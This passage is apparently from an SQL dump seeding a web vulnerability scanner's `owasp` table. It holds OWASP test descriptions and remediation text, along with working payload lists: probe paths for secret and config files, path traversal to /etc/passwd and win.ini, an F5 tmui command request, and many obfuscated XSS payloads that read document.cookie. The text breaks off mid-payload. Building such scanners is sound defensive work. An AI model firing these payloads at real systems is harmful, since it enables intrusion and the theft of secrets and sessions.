  \"/rgs/\",\n      \"/rgsclients/\",\n      \"/ring\",\n      \"/robomongo.json\",\n      \"/robots.txt\",\n      \"/robots.txt%2e%2e%3B/\",\n      \"/robots.txt..%3B/\",\n      \"/robots.txt../admin/\",\n      \"/robots.txt..;/\",\n      \"/robots.txt/%2e%2e%3B/\",\n      \"/robots.txt/..%3B/\",\n      \"/robots.txt/../admin/\",\n      \"/robots.txt/..;/\",\n      \"/roundcube\",\n      \"/roundcube/logs/errors.log\",\n      \"/roundcube/logs/sendmail\",\n      \"/routes\",\n      \"/routes/error_log\",\n      \"/routez\",\n      \"/rpc/\",\n      \"/rpcwithcert/\",\n      \"/ruby/config/storage.yml\",\n      \"/rules\",\n      \"/rulez\",\n      \"/run\",\n      \"/run.sh\",\n      \"/runningpods\",\n      \"/runtime\",\n      \"/runtime_modify\",\n      \"/s/sfsites/aura\",\n      \"/s3cmd.ini\",\n      \"/s3proxy.conf\",\n      \"/sap/bc/gui/sap/its/webgui\",\n      \"/sap/hana/xs/formLogin/login.html\",\n      \"/sap/wdisp/admin/public/default.html\",\n      \"/sapi/debug/default/view\",\n      \"/scheduler/\",\n      \"/schema\",\n      \"/schema.rb\",\n      \"/script\",\n      \"/scriptText\",\n      \"/search\",\n      \"/search/token.json\",\n      \"/search?search_key={{1337*1338}}\",\n      \"/searchableSnapshots\",\n      \"/secret\",\n      \"/secret_token.rb\",\n      \"/secrets.yml\",\n      \"/secure/admin\",\n      \"/secure/ConfigurePortalPages!default.jspa?view=popular\",\n      \"/secure/ContactAdministrators!default.jspa\",\n      \"/secure/Dashboard.jspa\",\n      \"/secure/ManageFilters.jspa?filter=popular&filterView=popular\",\n      \"/secure/ManageFilters.jspa?filterView=search&Search=Search&filterView=search&sortColumn=favcount&sortAscending=false\",\n      \"/secure/popups/UserPickerBrowser.jspa\",\n      \"/secure/QueryComponent!Default.jspa\",\n      \"/secure/ViewUserHover.jspa\",\n      \"/security.txt\",\n      \"/security.yml\",\n      \"/sell\",\n      \"/seminovos/application/configs/application.ini\",\n      \"/server\",\n      \"/server-info\",\n      \"/server-status\",\n      \"/server.key\",\n      \"/server/storage/\",\n      \"/server_info\",\n      \"/service\",\n      \"/service-account-credentials.json\",\n      \"/service-discovery\",\n      \"/service/rest/swagger.json\",\n      \"/service?Wsdl\",\n      \"/servicedesk/customer/user/login\",\n      \"/servicedesk/customer/user/signup\",\n      \"/services/Version\",\n      \"/servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=xml&srcURL=https\",\n      \"/servlist.conf\",\n      \"/sessions/new\",\n      \"/settings.php.bak\",\n      \"/settings.php.dist\",\n      \"/settings.php.old\",\n      \"/settings.php.save\",\n      \"/settings.php.swp\",\n      \"/settings.php.txt\",\n      \"/settings.py\",\n      \"/settings.yml\",\n      \"/settings/settings.py\",\n      \"/setup-config.php\",\n      \"/setup.sh\",\n      \"/sfsites/aura\",\n      \"/sftp-config.json\",\n      \"/share/page/dologin\",\n      \"/shop/\",\n      \"/shop/application/configs/application.ini\",\n      \"/shutdown\",\n      \"/sidekiq\",\n      \"/sign-in\",\n      \"/site.sql\",\n      \"/site_cg/application/configs/application.ini\",\n      \"/sitecore/shell/sitecore.version.xml\",\n      \"/sitemanager.xml\",\n      \"/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/phpunit\",\n      \"/slow_query\",\n      \"/slow_query/<tag>\",\n      \"/slow_query/all\",\n      \"/slr/application/configs/application.ini\",\n      \"/smb.conf\",\n      \"/solr/\",\n      \"/spans\",\n      \"/spec\",\n      \"/sphinx\",\n      \"/sphinx-graphiql\",\n      \"/spring\",\n      \"/sql.sql\",\n      \"/sql/dump.sql\",\n      \"/ssl/localhost.key\",\n      \"/sslmgr\",\n      \"/stages/\",\n      \"/startup.sh\",\n      \"/stat.jsp?cmd=chcp+437+%7c+dir\",\n      \"/state\",\n      \"/static\",\n      \"/static%2e%2e%3B/\",\n      \"/static..%3B/\",\n      \"/static../.git/config\",\n      \"/static../admin/\",\n      \"/static..;/\",\n      \"/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini\",\n      \"/static/%2e%2e%3B/\",\n      \"/static/..%3B/\",\n      \"/static/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd\",\n      \"/static/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd\",\n      \"/static/..%5c..%5c..%5c..%5c..%5cetc/passwd\",\n      \"/static/..%5c..%5c..%5c..%5cetc/passwd\",\n      \"/static/..%5c..%5c..%5cetc/passwd\",\n      \"/static/..%5c..%5cetc/passwd\",\n      \"/static/..%5cetc/passwd\",\n      \"/static/../../../a/../../../../etc/passwd\",\n      \"/static/../admin/\",\n      \"/static/..;/\",\n      \"/static/api/swagger.json\",\n      \"/static/api/swagger.yaml\",\n      \"/static/emq.ico\",\n      \"/stats\",\n      \"/stats/summary\",\n      \"/status\",\n      \"/status.php\",\n      \"/status/selfDiscovered/status\",\n      \"/storage-capacity\",\n      \"/storage.yml\",\n      \"/storage/\",\n      \"/storage/logs/laravel.log\",\n      \"/store/app/etc/local.xml\",\n      \"/stub_status\",\n      \"/subscriptions\",\n      \"/subsz\",\n      \"/svnserve.conf\",\n      \"/swagger\",\n      \"/swagger-json\",\n      \"/swagger-resources\",\n      \"/swagger-resources/restservices/v2/api-docs\",\n      \"/swagger-ui\",\n      \"/swagger-ui.html\",\n      \"/swagger-ui.js\",\n      \"/swagger-ui/\",\n      \"/swagger-ui/index.html\",\n      \"/swagger-ui/o2c.html\",\n      \"/swagger-ui/oauth2-redirect.html\",\n      \"/swagger-ui/swagger-ui.js\",\n      \"/swagger.json\",\n      \"/swagger.yaml\",\n      \"/swagger/api-docs\",\n      \"/swagger/doc.html\",\n      \"/swagger/doc.json\",\n      \"/swagger/index.html\",\n      \"/swagger/swagger\",\n      \"/swagger/swagger-ui.html\",\n      \"/swagger/swagger-ui.js\",\n      \"/swagger/ui/index\",\n      \"/swagger/ui/swagger-ui.js\",\n      \"/swagger/v1/api-docs\",\n      \"/swagger/v1/swagger.json\",\n      \"/swagger/v1/swagger.json/\",\n      \"/swagger/v1/swagger.yaml\",\n      \"/swagger/v2/api-docs\",\n      \"/swagger/v2/swagger.json\",\n      \"/swagger/v2/swagger.yaml\",\n      \"/swaggerui/\",\n      \"/sys\",\n      \"/system\",\n      \"/system-diagnostics\",\n      \"/systemstatus.xml\",\n      \"/tag\",\n      \"/tag.json\",\n      \"/targets\",\n      \"/td-agent.log\",\n      \"/Telerik.Web.UI.DialogHandler.aspx\",\n      \"/Telerik.Web.UI.DialogHandler.aspx?dp=1\",\n      \"/Telerik.Web.UI.DialogHandler.axd?dp=1\",\n      \"/Telerik.Web.UI.WebResource.axd?type=rau\",\n      \"/telescope/requests\",\n      \"/temp.php\",\n      \"/temp.sql\",\n      \"/test\",\n      \"/test.cgi\",\n      \"/test.php\",\n      \"/test/config/secrets.yml\",\n      \"/test/pathtraversal/master/..%252f..%252f..%252f..%252f../etc/passwd\",\n      \"/threaddump\",\n      \"/throttler\",\n      \"/Thumbs.db\",\n      \"/tiki\",\n      \"/time.php\",\n      \"/tmui/login.jsp\",\n      \"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license\",\n      \"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/f5\",\n      \"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd\",\n      \"/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwdd\",\n      \"/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin\",\n      \"/tmui/tmui/login/welcome.jsp\",\n      \"/token.json\",\n      \"/tomcat-docs\",\n      \"/tomcat-status\",\n      \"/tool/view/phpinfo.view.php\",\n      \"/tools/adminer.php\",\n      \"/toolsadminer.php\",\n      \"/trace\",\n      \"/Trace.axd\",\n      \"/tracez\",\n      \"/tracing\",\n      \"/translate.sql\",\n      \"/translations/en.json\",\n      \"/tree\",\n      \"/ucwa/\",\n      \"/ueditor/php/getRemoteImage.php\",\n      \"/ui\",\n      \"/ui/login.action\",\n      \"/ui/vault/auth\",\n      \"/unifiedmessaging/\",\n      \"/update.sh\",\n      \"/uploads/\",\n      \"/user\",\n      \"/user.ini\",\n      \"/user/0\",\n      \"/user/1\",\n      \"/user/2\",\n      \"/user/3\",\n      \"/user/login\",\n      \"/userportal/webpages/myaccount/login.jsp\",\n      \"/users.sql\",\n      \"/v0.1/\",\n      \"/v1\",\n      \"/v1.0\",\n      \"/v1.0/\",\n      \"/v1.37/info\",\n      \"/v1.37/version\",\n      \"/v1/\",\n      \"/v1/altair\",\n      \"/v1/api-docs\",\n      \"/v1/api/graphql\",\n      \"/v1/data\",\n      \"/v1/explorer\",\n      \"/v1/graph\",\n      \"/v1/graphiql\",\n      \"/v1/graphiql.css\",\n      \"/v1/graphiql.js\",\n      \"/v1/graphiql.min.css\",\n      \"/v1/graphiql.min.js\",\n      \"/v1/graphiql.php\",\n      \"/v1/graphiql/finland\",\n      \"/v1/graphql\",\n      \"/v1/graphql-explorer\",\n      \"/v1/graphql.php\",\n      \"/v1/graphql/console\",\n      \"/v1/graphql/schema.json\",\n      \"/v1/graphql/schema.xml\",\n      \"/v1/graphql/schema.yaml\",\n      \"/v1/playground\",\n      \"/v1/policies\",\n      \"/v1/subscriptions\",\n      \"/v2\",\n      \"/v2/altair\",\n      \"/v2/api-docs\",\n      \"/v2/api/graphql\",\n      \"/v2/explorer\",\n      \"/v2/graph\",\n      \"/v2/graphiql\",\n      \"/v2/graphiql.css\",\n      \"/v2/graphiql.js\",\n      \"/v2/graphiql.min.css\",\n      \"/v2/graphiql.min.js\",\n      \"/v2/graphiql.php\",\n      \"/v2/graphiql/finland\",\n      \"/v2/graphql\",\n      \"/v2/graphql-explorer\",\n      \"/v2/graphql.php\",\n      \"/v2/graphql/console\",\n      \"/v2/graphql/schema.json\",\n      \"/v2/graphql/schema.xml\",\n      \"/v2/graphql/schema.yaml\",\n      \"/v2/keys\",\n      \"/v2/keys/\",\n      \"/v2/members\",\n      \"/v2/playground\",\n      \"/v2/stats/leader\",\n      \"/v2/stats/self\",\n      \"/v2/subscriptions\",\n      \"/v3\",\n      \"/v3/altair\",\n      \"/v3/api/graphql\",\n      \"/v3/explorer\",\n      \"/v3/graph\",\n      \"/v3/graphiql\",\n      \"/v3/graphiql.css\",\n      \"/v3/graphiql.js\",\n      \"/v3/graphiql.min.css\",\n      \"/v3/graphiql.min.js\",\n      \"/v3/graphiql.php\",\n      \"/v3/graphiql/finland\",\n      \"/v3/graphql\",\n      \"/v3/graphql-explorer\",\n      \"/v3/graphql.php\",\n      \"/v3/graphql/console\",\n      \"/v3/graphql/schema.json\",\n      \"/v3/graphql/schema.xml\",\n      \"/v3/graphql/schema.yaml\",\n      \"/v3/playground\",\n      \"/v3/subscriptions\",\n      \"/v3alpha/auth/authenticate\",\n      \"/v4/altair\",\n      \"/v4/api/graphql\",\n      \"/v4/explorer\",\n      \"/v4/graph\",\n      \"/v4/graphiql\",\n      \"/v4/graphiql.css\",\n      \"/v4/graphiql.js\",\n      \"/v4/graphiql.min.css\",\n      \"/v4/graphiql.min.js\",\n      \"/v4/graphiql.php\",\n      \"/v4/graphiql/finland\",\n      \"/v4/graphql\",\n      \"/v4/graphql-explorer\",\n      \"/v4/graphql.php\",\n      \"/v4/graphql/console\",\n      \"/v4/graphql/schema.json\",\n      \"/v4/graphql/schema.xml\",\n      \"/v4/graphql/schema.yaml\",\n      \"/v4/playground\",\n      \"/v4/subscriptions\",\n      \"/Vagrantfile\",\n      \"/var/jwt/private.pem\",\n      \"/var/lib/mysql/mysql/user.frm\",\n      \"/var/lib/postgresql/data/pg_hba.conf\",\n      \"/varz\",\n      \"/vendor/composer/installed.json\",\n      \"/vendor/phpunit/phpunit/phpunit\",\n      \"/vendor/webmozart/assert/.composer-auth.json\",\n      \"/verifier\",\n      \"/verify.php?id=1&confirm_hash=\",\n      \"/version\",\n      \"/Version\",\n      \"/version.web\",\n      \"/views/ajax/autocomplete/user/a\",\n      \"/virtualems/Login.aspx\",\n      \"/VirtualEms/Login.aspx\",\n      \"/vpn/../vpns/cfg/smb.conf\",\n      \"/vpn/index.html\",\n      \"/wavemaker/studioService.download?method=getContent&inUrl=file///etc/passwd\",\n      \"/web-console\",\n      \"/WEB-INF/web.xml\",\n      \"/web-runtime-monitor\",\n      \"/web.config\",\n      \"/Web.config\",\n      \"/web/adminer.php\",\n      \"/web/debug/default/view\",\n      \"/web/home.html\",\n      \"/web/index.html\",\n      \"/web/manifest.json\",\n      \"/web/phpmyadmin/\",\n      \"/web/settings/settings.py\",\n      \"/web/static/c\",\n      \"/web_caps/webCapsConfig\",\n      \"/webadmin/out\",\n      \"/webadmin/start/\",\n      \"/webadmin/tools/systemstatus_remote.php\",\n      \"/webadminer.php\",\n      \"/webalizer/\",\n      \"/webapi/v1/system/accountmanage/account\",\n      \"/webapps/ROOT/WEB-INF/web.xml\",\n      \"/webclient/Login.xhtml\",\n      \"/webconsole/webpages/login.jsp\",\n      \"/webmail/\",\n      \"/webmail/calendar/minimizer/index.php?style=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc%5cpasswd\",\n      \"/webmin/\",\n      \"/webpack.config.js\",\n      \"/webpack.mix.js\",\n      \"/WebReport/ReportServer\",\n      \"/webstats/awstats.pl\",\n      \"/webticket/\",\n      \"/webticket/webticketservice.svc\",\n      \"/webticket/webticketservice.svcabs/\",\n      \"/wgetrc\",\n      \"/whoAmI/\",\n      \"/wiki\",\n      \"/wls-wsat/CoordinatorPortType\",\n      \"/WLSConsole/\",\n      \"/wordpress/wp-config.php\",\n      \"/wordpress/wp-content/debug.log\",\n      \"/wp\",\n      \"/wp-config-sample.php\",\n      \"/wp-config.php\",\n      \"/wp-includes/wp-db.php\",\n      \"/ws2020/\",\n      \"/ws2021/\",\n      \"/ws_ftp.ini\",\n      \"/www.key\",\n      \"/xampp/phpmyadmin/\",\n      \"/xdebug/\",\n      \"/xds\",\n      \"/xmldata?item=all\",\n      \"/xmldata?item=CpqKey\",\n      \"/xmlrpc.php\",\n      \"/xprober.php\",\n      \"/yarn.lock\",\n      \"/yii/vendor/phpunit/phpunit/phpunit\",\n      \"/zabbix.php?action=dashboard.view&dashboardid=1\",\n      \"/zend/vendor/phpunit/phpunit/phpunit\",\n      \"/zenphoto/zp\",\n      \"/zipkin/\",\n      \"/zm/?view=log\",\n      \"/zms/v1\",\n      \"/zp\",\n      \"/zp/zp\",\n      \"/zts/v1\",\n      \"\",\n      \"\"\n    ]\n  }', 'WSTG-CONF-09', 0, 'Medium');
INSERT INTO `owasp` (`OID`, `Vul_name`, `Vul_des`, `vul_sol`, `vul_ref`, `payloadlist`, `OType`, `PID`, `Severity`) VALUES
(8, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 0, 'Low'),
(9, 'Web Application Framework Infomation Leakage', 'There is nothing new under the sun, and nearly every web application that one may think of developing has already been developed. With the vast number of free and Open Source software projects that are actively developed and deployed around the world, it is very likely that an application security test will face a target that is entirely or partly dependent on these well known applications or frameworks (e.g. WordPress, phpBB, Mediawiki, etc). Knowing the web application components that are being tested significantly helps in the testing process and will also drastically reduce the effort required during the test. These well known web applications have known HTML headers, cookies, and directory structures that can be enumerated to identify the application. Most of the web frameworks have several markers in those locations which help an attacker or tester to recognize them. This is basically what all automatic tools do, they look for a marker from a predefined location and then compare it to the database of known signatures. For better accuracy several markers are usually used.', 'While efforts can be made to use different cookie names (through changing configs), hiding or changing file/directory paths (through rewriting or source code changes), removing known headers, etc. such efforts boil down to “security through obscurity”. System owners/admins should recognize that those efforts only slow down the most basic of adversaries. The time/effort may be better used on stakeholder awareness and solution maintenance activities.', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework', '{\n    \"web_response\": [\n      \"Express\",\n      \"Django\",\n      \"Phusion Passenger\",\n      \"Flask\",\n      \"ASP.NET\",\n      \"SpringBoot\",\n      \"FastAPI\",\n      \"Laravel\",\n      \"Play Framework\",\n      \"Meteor\",\n      \"NestJS\",\n      \"CherryPy\",\n      \"Mono\",\n      \"Blood, sweat and tears\",\n      \"Swiftlet\",\n      \"X-Powered-By\",\n      \"X-Generator\",\n      \"WoltLab\",\n      \"XenForo\",\n      \"vBulletin\",\n      \"MyBB\",\n      \"OpenCart\",\n      \"Shopify\",\n      \"Magento\",\n      \"PrestaShop\",\n      \"Joomla\",\n      \"MediaWiki\",\n      \"SMF\",\n      \"wcf_user\",\n      \"xf_user\",\n      \"vb_session\",\n      \"mybb\",\n      \"oc_sessionPassphrase\",\n      \"_secure_session_id\",\n      \"frontend\",\n      \"adminhtml\",\n      \"PrestaShop-[some_numeric_value]\",\n      \"joomla_user_state\",\n      \"wiki_session\",\n      \"SMFCookie[numeric_value]\",\n      \"zope\",\n      \"cakephp\",\n      \"kohanasession\",\n      \"laravel_session\",\n      \"phpbb3_\",\n      \"wp-settings\",\n      \"BITRIX_\",\n      \"AMP\",\n      \"django\",\n      \"DotNetNukeAnonymous\",\n      \"e107_tz\",\n      \"EPiTrace\",\n      \"EPiServer\",\n      \"graffitibot\",\n      \"hotaru_mobile\",\n      \"ICMSession\",\n      \"MAKACSESSION\",\n      \"InstantCMS[logdate]\",\n      \"CMSPreferredCulture\",\n      \"SN4[12symb]\",\n      \"fe_typo_user\",\n      \"Dynamicweb\",\n      \"lep[some_numeric_value]+sessionid\",\n      \"Domain=.wix.com\",\n      \"VivvoSessionId\"\n    ],\n    \"web-html\": [\n      \"<flask\",\n      \"{% extends \\\"base.html\\\" %}\",\n      \"<spring\",\n      \"<th:include\",\n      \"@extends\",\n      \"@section\",\n      \"@yield\",\n      \"<ng-app\",\n      \"<ng-controller\",\n      \"<ng-repeat\",\n      \"<ng-if\",\n      \"<div data-reactroot\",\n      \"<div data-reactid\",\n      \"<ng-app\",\n      \"<ng-controller\",\n      \"<div v-bind\",\n      \"<input v-model\",\n      \"<script src=\\\"https://code.jquery.com/jquery-3.6.0.min.js\\\"></script>\",\n      \"{% extends\",\n      \"{% block\",\n      \"<ng-app\",\n      \"<ng-controller\",\n      \"<ng-repeat\",\n      \"<ng-if\",\n      \"<div v-bind\",\n      \"<input v-model\",\n      \"<ul v-for\",\n      \"<li v-for\",\n      \"<script src=\\\"https://code.jquery.com/jquery-3.6.0.min.js\\\"></script>\",\n      \"<script src=\\\"/path/to/jquery.js\\\"></script>\",\n      \"{% block\",\n      \"{% include\",\n      \"{% for\",\n      \"<%= render\",\n      \"<%= link_to\",\n      \"<%= form_for\"\n    ]\n  }', 'WSTG-INFO-08', 0, 'Low'),
(10, 'Reflected Cross Site Scriptng', 'Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application\'s immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user\'s browser in the context of that user\'s session with the application.\n\nThe attacker-supplied code can perform a wide variety of actions, such as stealing the victim\'s session token or login credentials, performing arbitrary actions on the victim\'s behalf, and logging their keystrokes.\n\nUsers can be induced to issue the attacker\'s crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).', 'In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:\n\nInput should be validated as strictly as possible on arrival, given the kind of content that it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.\nUser input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including < > \" \' and =, should be replaced with the corresponding HTML entities (&lt; &gt; etc).\nIn cases where the application\'s functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.', 'https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected', ' {\n    \"xss-sql\": [\n      \"\'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E\",\n      \"<<scr\\u0000ipt/src=https://www.google.com/></script\",\n      \"%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E\",\n      \"\' onmouseover=alert(/XSS/)\",\n      \"\\\"><iframe%20src=\\\"http://google.com\\\"%%203E\\\"\",\n      \"\'<script>window.onload=function(){document.forms[0].message.value=\'1\';}</script>\",\n      \"x\\u201d</title><img src%3dx onerror%3dalert(1)>\",\n      \"<script> document.getElementById(%22safe123%22).setCapture(); document.getElementById(%22safe123%22).click(); </script>\",\n      \"<script>Object.defineProperties(window, {Safe: {value: {get: function() {return document.cookie}}}});alert(Safe.get())</script>\",\n      \"<script>var x = document.createElement(\'iframe\');document.body.appendChild(x);var xhr = x.contentWindow.XMLHttpRequest();xhr.open(\'GET\', \'http://xssme.html5sec.org/xssme2\', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = \'(.*?)\'/)[1]) };xhr.send();</script>\",\n      \"<script>(function() {var event = document.createEvent(%22MouseEvents%22);event.initMouseEvent(%22click%22, true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);var fakeData = [event, {isTrusted: true}, event];arguments.__defineGetter__(\'0\', function() { return fakeData.pop(); });alert(Safe.get.apply(null, arguments));})();</script>\",\n      \"<script>var script = document.getElementsByTagName(\'script\')[0]; var clone = script.childNodes[0].cloneNode(true); var ta = document.createElement(\'textarea\'); ta.appendChild(clone); alert(ta.value.match(/cookie = \'(.*?)\'/)[1])</script>\",\n      \"<script>xhr=new ActiveXObject(%22Msxml2.XMLHTTP%22);xhr.open(%22GET%22,%22/xssme2%22,true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/\'([^\']%2b)/)[1])}};xhr.send();</script>\",\n      \"<script>alert(document.documentElement.innerHTML.match(/\'([^\']%2b)/)[1])</script>\",\n      \"<script>alert(document.getElementsByTagName(\'html\')[0].innerHTML.match(/\'([^\']%2b)/)[1])</script>\",\n      \"<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = \'(%2e%2a%3f)\'%22)[%31]); </%73%63%72%69%70%74>\",\n      \"<script> var xdr = new ActiveXObject(%22Microsoft.XMLHTTP%22);  xdr.open(%22get%22, %22/xssme2%3Fa=1%22, true); xdr.onreadystatechange = function() { try{   var c;   if (c=xdr.responseText.match(/document.cookie = \'(.*%3F)\'/) )    alert(c[1]); }catch(e){} };  xdr.send(); </script>\",\n      \"<iframe id=%22ifra%22 src=%22/%22></iframe> <script>ifr = document.getElementById(\'ifra\'); ifr.contentDocument.write(%22<scr%22 %2b %22ipt>top.foo = Object.defineProperty</scr%22 %2b %22ipt>%22); foo(window, \'Safe\', {value:{}}); foo(Safe, \'get\', {value:function() {    return document.cookie }}); alert(Safe.get());</script>\",\n      \"<script>alert(document.head.innerHTML.substr(146,20));</script>\",\n      \"<script>alert(document.head.childNodes[3].text)</script>\",\n      \"<script>var request = new XMLHttpRequest();request.open(\'GET\', \'http://html5sec.org/xssme2\', false);request.send(null);if (request.status == 200){alert(request.responseText.substr(150,41));}</script>\",\n      \"<script>Object.defineProperty(window, \'Safe\', {value:{}});Object.defineProperty(Safe, \'get\', {value:function() {return document.cookie}});alert(Safe.get())</script>\",\n      \"<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>r=new XMLHttpRequest();r.open(\'GET\',\'http://xssme.html5sec.org/xssme2\',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\\\\/script>%22)};document.body.appendChild(x);</script>\",\n      \"<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>Object.defineProperty(parent,\'Safe\',{value:{}});Object.defineProperty(parent.Safe,\'get\',{value:function(){return top.document.cookie}});alert(parent.Safe.get())<\\\\/script>%22)};document.body.appendChild(x);</script>\",\n      \"<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open(\'GET\',+\'/xssme2\',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B\'(.*)\'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>\",\n      \"<script> document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click({\'type\':\'click\',\'isTrusted\':true}); </script>\",\n      \"<script> var+MouseEvent=function+MouseEvent(){}; MouseEvent=MouseEvent var+test=new+MouseEvent(); test.isTrusted=true; test.type=\'click\';  document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click(test); </script>\",\n      \"<script>  (function (o) {   function exploit(x) {    if (x !== null)     alert(\'User cookie is \' %2B x);    else     console.log(\'fail\');   }      o.onclick = function (e) {    e.__defineGetter__(\'isTrusted\', function () { return true; });    exploit(Safe.get());   };      var e = document.createEvent(\'MouseEvent\');   e.initEvent(\'click\', true, true);   o.dispatchEvent(e);  })(document.getElementById(\'safe123\')); </script>\",\n      \"<iframe src=/ onload=eval(unescape(this.name.replace(/\\\\/g,null))) name=fff%253Dnew%2520this.contentWindow.window.XMLHttpRequest%2528%2529%253Bfff.open%2528%2522GET%2522%252C%2522xssme2%2522%2529%253Bfff.onreadystatechange%253Dfunction%2528%2529%257Bif%2520%2528fff.readyState%253D%253D4%2520%2526%2526%2520fff.status%253D%253D200%2529%257Balert%2528fff.responseText%2529%253B%257D%257D%253Bfff.send%2528%2529%253B></iframe>\",\n      \"<script>     function b() { return Safe.get(); } alert(b({type:String.fromCharCode(99,108,105,99,107),isTrusted:true})); </script>\",\n      \"<img src=http://www.google.fr/images/srpr/logo3w.png onload=alert(this.ownerDocument.cookie) width=0 height= 0 /> #\",\n      \"<script>  function foo(elem, doc, text) {   elem.onclick = function (e) {    e.__defineGetter__(text[0], function () { return true })    alert(Safe.get());   };      var event = doc.createEvent(text[1]);   event.initEvent(text[2], true, true);   elem.dispatchEvent(event);  } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerDocument,this.name.split(/,/)) name=isTrusted,MouseEvent,click width=0 height=0 /> #\",\n      \"<SCRIPT+FOR=document+EVENT=onreadystatechange>MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;getElementById(%22safe123%22).click=function()+{alert(Safe.get());};getElementById(%22safe123%22).click(test);</SCRIPT>#\",\n      \"<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open(\'GET\',+\'/xssme2\',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B\'(.*)\'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>#\",\n      \"<video+onerror=\'javascript:MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());};document.getElementById(%22safe123%22).click(test);\'><source>%23\",\n      \"<script for=document event=onreadystatechange>getElementById(\'safe123\').click()</script>\",\n      \"<script> var+x+=+showModelessDialog+(this); alert(x.document.cookie); </script>\",\n      \"<script> location.href = \'data:text/html;base64,PHNjcmlwdD54PW5ldyBYTUxIdHRwUmVxdWVzdCgpO3gub3BlbigiR0VUIiwiaHR0cDovL3hzc21lLmh0bWw1c2VjLm9yZy94c3NtZTIvIix0cnVlKTt4Lm9ubG9hZD1mdW5jdGlvbigpIHsgYWxlcnQoeC5yZXNwb25zZVRleHQubWF0Y2goL2RvY3VtZW50LmNvb2tpZSA9ICcoLio/KScvKVsxXSl9O3guc2VuZChudWxsKTs8L3NjcmlwdD4=\'; </script>\",\n      \"<iframe src=%22404%22 onload=%22frames[0].document.write(%26quot;<script>r=new 